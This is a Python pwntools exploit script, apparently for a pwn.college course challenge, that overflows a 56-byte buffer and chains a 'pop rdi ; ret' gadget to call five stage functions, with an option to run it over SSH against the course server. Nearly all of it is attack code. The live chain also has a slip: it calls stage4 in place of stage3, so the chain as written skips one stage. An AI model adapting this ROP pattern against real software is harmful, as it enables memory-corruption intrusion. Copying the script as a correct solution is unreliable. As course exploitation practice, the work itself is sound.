#!/usr/bin/env python2
from pwn import *
import time, sys

KEYPATH = "/root/pwn/pwn.college/.id_rsa"

binary = "./babyrop_level3_testing1"

context.log_level = 'DEBUG'

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    conn = ssh("cse466", "cse466.pwn.college", keyfile=KEYPATH)
    p = conn.process(binary, cwd="/")
else:
    p = process(binary)

offset = 56
# there are 5 functions we need to call, so we need to pass 5 values to each of them
#gadget = p64(0x0000000000402aeb) # pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# oh shit
# i think i understand now
# the reason callme used popped 3 registers is because every function needed 3 parameters
# the same gadget was used for each remember!??!?!
# gadget = p64(0x0000000000402af3) # pop rdi ; ret????

#stage1 = p64(0x00402834)
#stage2 = p64(0x00402797)
#stage3 = p64(0x0040265d)
#stage4 = p64(0x004025c0)
#stage5 = p64(0x004026fa)

#payload = "A"*offset
#payload += gadget
#payload += p64(0x1)
#payload += stage1

#payload += gadget
#payload += p64(0x2)
#payload += stage2

#payload += gadget
#payload += p64(0x3)
#payload += stage3

#payload += gadget
#payload += p64(0x4)
#payload += stage4

#payload += gadget
#payload += p64(0x5)
#payload += stage5



gadget = p64(0x0000000000401713)  # pop rdi ; ret

stage1 = p64(0x004013bf)
stage2 = p64(0x004014f9)
stage3 = p64(0x00401322)
stage4 = p64(0x00401596)
stage5 = p64(0x0040145c)

payload = "A"*offset

payload += gadget
payload += p64(0x1)
payload += stage1

payload += gadget
payload += p64(0x2)
payload += stage2

payload += gadget
payload += p64(0x3)
payload += stage4

payload += gadget
payload += p64(0x4)
payload += stage4

payload += gadget
payload += p64(0x5)
payload += stage5

#p.send(payload)
time.sleep(0.2)
p.send(payload)
pause()

print(p.recvall())
